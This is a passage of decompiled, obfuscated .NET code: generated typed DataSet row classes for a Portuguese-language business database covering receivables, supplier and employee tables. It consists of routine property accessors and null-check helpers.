			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_CONTASRECEBERRow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_CONTASRECEBER = (TB_CONTASRECEBERDataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDATA_VENDANull()
			{
				return IsNull(tableTB_CONTASRECEBER.DATA_VENDAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDATA_VENDANull()
			{
				base[tableTB_CONTASRECEBER.DATA_VENDAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDESCRICAONull()
			{
				return IsNull(tableTB_CONTASRECEBER.DESCRICAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDESCRICAONull()
			{
				base[tableTB_CONTASRECEBER.DESCRICAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsNOMENull()
			{
				return IsNull(tableTB_CONTASRECEBER.NOMEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetNOMENull()
			{
				base[tableTB_CONTASRECEBER.NOMEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsVALORNull()
			{
				return IsNull(tableTB_CONTASRECEBER.VALORColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetVALORNull()
			{
				base[tableTB_CONTASRECEBER.VALORColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsOBSERVACAONull()
			{
				return IsNull(tableTB_CONTASRECEBER.OBSERVACAOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetOBSERVACAONull()
			{
				base[tableTB_CONTASRECEBER.OBSERVACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSITUACAONull()
			{
				return IsNull(tableTB_CONTASRECEBER.SITUACAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSITUACAONull()
			{
				base[tableTB_CONTASRECEBER.SITUACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsTEL_CELNull()
			{
				return IsNull(tableTB_CONTASRECEBER.TEL_CELColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetTEL_CELNull()
			{
				base[tableTB_CONTASRECEBER.TEL_CELColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsTEL_RESNull()
			{
				return IsNull(tableTB_CONTASRECEBER.TEL_RESColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetTEL_RESNull()
			{
				base[tableTB_CONTASRECEBER.TEL_RESColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDATA_VENCIMENTONull()
			{
				return IsNull(tableTB_CONTASRECEBER.DATA_VENCIMENTOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetDATA_VENCIMENTONull()
			{
				base[tableTB_CONTASRECEBER.DATA_VENCIMENTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_FORNECEDORESRow : DataRow
		{
			private TB_FORNECEDORESDataTable tableTB_FORNECEDORES;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Código
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_FORNECEDORES.CódigoColumn]);
				}
				set
				{
					base[tableTB_FORNECEDORES.CódigoColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string NOME_FORNEC
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.NOME_FORNECColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(12048), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.NOME_FORNECColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string ENDERECO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.ENDERECOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(12190), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.ENDERECOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string NOME_FANTASIA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.NOME_FANTASIAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(12326), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.NOME_FANTASIAColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string BAIRRO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.BAIRROColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(12472), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.BAIRROColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string CIDADE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.CIDADEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(12604), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.CIDADEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string COMPLEMENTO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.COMPLEMENTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(12736), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.COMPLEMENTOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DateTime DAT_CAD
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_FORNECEDORES.DAT_CADColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(12878), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.DAT_CADColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double TEL_FIX1
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.TEL_FIX1Column]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13012), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.TEL_FIX1Column] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double TEL_FIX2
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.TEL_FIX2Column]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13148), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.TEL_FIX2Column] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double TEL_CEL
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.TEL_CELColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13284), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.TEL_CELColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double FAX
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.FAXColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13418), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.FAXColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double CNPJ
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.CNPJColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13544), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.CNPJColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double INS
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.INSColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13672), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.INSColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double CPF
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.CPFColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13798), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.CPFColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double RG
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FORNECEDORES.RGColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(13924), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.RGColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string EMISSOR
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.EMISSORColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14048), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.EMISSORColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string OBSERVACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.OBSERVACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14182), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.OBSERVACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string SIT
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.SITColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14322), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.SITColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string FACEBOOK
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.FACEBOOKColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14448), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.FACEBOOKColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string UF
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.UFColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14584), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.UFColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string EMAIL
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.EMAILColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14708), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.EMAILColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string REPRESENTANTE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FORNECEDORES.REPRESENTANTEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14838), ex);
					}
				}
				set
				{
					base[tableTB_FORNECEDORES.REPRESENTANTEColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_FORNECEDORESRow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_FORNECEDORES = (TB_FORNECEDORESDataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsNOME_FORNECNull()
			{
				return IsNull(tableTB_FORNECEDORES.NOME_FORNECColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetNOME_FORNECNull()
			{
				base[tableTB_FORNECEDORES.NOME_FORNECColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsENDERECONull()
			{
				return IsNull(tableTB_FORNECEDORES.ENDERECOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetENDERECONull()
			{
				base[tableTB_FORNECEDORES.ENDERECOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsNOME_FANTASIANull()
			{
				return IsNull(tableTB_FORNECEDORES.NOME_FANTASIAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetNOME_FANTASIANull()
			{
				base[tableTB_FORNECEDORES.NOME_FANTASIAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsBAIRRONull()
			{
				return IsNull(tableTB_FORNECEDORES.BAIRROColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetBAIRRONull()
			{
				base[tableTB_FORNECEDORES.BAIRROColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCIDADENull()
			{
				return IsNull(tableTB_FORNECEDORES.CIDADEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCIDADENull()
			{
				base[tableTB_FORNECEDORES.CIDADEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCOMPLEMENTONull()
			{
				return IsNull(tableTB_FORNECEDORES.COMPLEMENTOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCOMPLEMENTONull()
			{
				base[tableTB_FORNECEDORES.COMPLEMENTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDAT_CADNull()
			{
				return IsNull(tableTB_FORNECEDORES.DAT_CADColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDAT_CADNull()
			{
				base[tableTB_FORNECEDORES.DAT_CADColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsTEL_FIX1Null()
			{
				return IsNull(tableTB_FORNECEDORES.TEL_FIX1Column);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetTEL_FIX1Null()
			{
				base[tableTB_FORNECEDORES.TEL_FIX1Column] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsTEL_FIX2Null()
			{
				return IsNull(tableTB_FORNECEDORES.TEL_FIX2Column);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetTEL_FIX2Null()
			{
				base[tableTB_FORNECEDORES.TEL_FIX2Column] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsTEL_CELNull()
			{
				return IsNull(tableTB_FORNECEDORES.TEL_CELColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetTEL_CELNull()
			{
				base[tableTB_FORNECEDORES.TEL_CELColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsFAXNull()
			{
				return IsNull(tableTB_FORNECEDORES.FAXColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetFAXNull()
			{
				base[tableTB_FORNECEDORES.FAXColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCNPJNull()
			{
				return IsNull(tableTB_FORNECEDORES.CNPJColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetCNPJNull()
			{
				base[tableTB_FORNECEDORES.CNPJColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsINSNull()
			{
				return IsNull(tableTB_FORNECEDORES.INSColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetINSNull()
			{
				base[tableTB_FORNECEDORES.INSColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCPFNull()
			{
				return IsNull(tableTB_FORNECEDORES.CPFColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetCPFNull()
			{
				base[tableTB_FORNECEDORES.CPFColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsRGNull()
			{
				return IsNull(tableTB_FORNECEDORES.RGColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetRGNull()
			{
				base[tableTB_FORNECEDORES.RGColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsEMISSORNull()
			{
				return IsNull(tableTB_FORNECEDORES.EMISSORColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetEMISSORNull()
			{
				base[tableTB_FORNECEDORES.EMISSORColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsOBSERVACAONull()
			{
				return IsNull(tableTB_FORNECEDORES.OBSERVACAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetOBSERVACAONull()
			{
				base[tableTB_FORNECEDORES.OBSERVACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSITNull()
			{
				return IsNull(tableTB_FORNECEDORES.SITColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSITNull()
			{
				base[tableTB_FORNECEDORES.SITColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsFACEBOOKNull()
			{
				return IsNull(tableTB_FORNECEDORES.FACEBOOKColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetFACEBOOKNull()
			{
				base[tableTB_FORNECEDORES.FACEBOOKColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsUFNull()
			{
				return IsNull(tableTB_FORNECEDORES.UFColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetUFNull()
			{
				base[tableTB_FORNECEDORES.UFColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsEMAILNull()
			{
				return IsNull(tableTB_FORNECEDORES.EMAILColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetEMAILNull()
			{
				base[tableTB_FORNECEDORES.EMAILColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsREPRESENTANTENull()
			{
				return IsNull(tableTB_FORNECEDORES.REPRESENTANTEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetREPRESENTANTENull()
			{
				base[tableTB_FORNECEDORES.REPRESENTANTEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_FUNCIONARIOSRow : DataRow
		{
			private TB_FUNCIONARIOSDataTable tableTB_FUNCIONARIOS;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Código
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_FUNCIONARIOS.CódigoColumn]);
				}
				set
				{
					base[tableTB_FUNCIONARIOS.CódigoColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string NOME_FUNCIONARIO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.NOME_FUNCIONARIOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(14984), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.NOME_FUNCIONARIOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string TIPO_FUNCIONARIO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.TIPO_FUNCIONARIOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(15136), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.TIPO_FUNCIONARIOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string APELIDO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.APELIDOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(15288), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.APELIDOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string ENDERECO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.ENDERECOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(15422), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.ENDERECOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string BAIRRO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.BAIRROColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(15558), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.BAIRROColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
